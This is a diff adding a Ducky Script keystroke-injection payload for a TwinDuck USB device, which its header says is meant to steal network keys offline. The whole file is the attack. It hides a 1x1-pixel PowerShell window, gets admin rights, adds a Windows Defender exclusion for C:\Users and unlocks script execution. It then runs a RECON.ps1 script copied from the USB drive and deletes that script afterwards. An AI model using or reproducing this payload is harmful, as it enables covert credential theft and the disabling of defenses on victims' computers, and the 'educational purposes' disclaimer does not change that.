@@ -1,0 +1,53 @@
+REM Carbziesss's Modified Version of nejcpirecnik's Chrome-Artemis to work offline and steal network keys with TwinDuck Firmware
+REM Change Drive Letters and Paths
+REM Use for Educational Purposes only
+REM You can change delay times in both this script and RECON.ps1 but I like to keep it moderately slow for slower computers.
+REM HAVE FUN!
+DELAY 2500
+ALT F4
+DELAY 500
+GUI r
+DELAY 400
+REM -Opens a 1x1 pixel powershell window to draw as little attention as possible-
+STRING powershell -noexit -command "[console]::WindowWidth=1; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth"
+DELAY 50
+ENTER
+DELAY 300
+STRING cd "$env:USERPROFILE"
+ENTER
+DELAY 200
+REM -Opens a 1x1 pixel admin powershell window to create a Windows Defender Exlusion and allow ps1 scripts to run then closes returning to previous powershell window-
+STRING start-process powershell -verb runas '-noexit -command "[console]::windowwidth=1; [console]::windowheight=1; [console]::bufferwidth=[console]::windowwidth"'
+ENTER
+DELAY 1000
+LEFT
+DELAY 100
+ENTER
+DELAY 600
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+DELAY 100
+STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
+ENTER
+DELAY 200
+STRING Y
+DELAY 100
+ENTER
+DELAY 200
+STRING exit
+ENTER
+DELAY 300
+REM -Copies RECON to current users User directory-
+STRING Copy-Item -Path "F:\Dependencies\RECON.ps1" -Destination $env:USERPROFILE\RECON.ps1
+ENTER
+DELAY 1500
+REM -Starts the now copied RECON, waits 4 seconds for the ps1 script to do its thing, then deletes it-
+STRING ./RECON.ps1
+ENTER
+DELAY 4000
+STRING del RECON.ps1
+ENTER
+DELAY 250
+STRING EXIT
+ENTER
+DELAY 1000
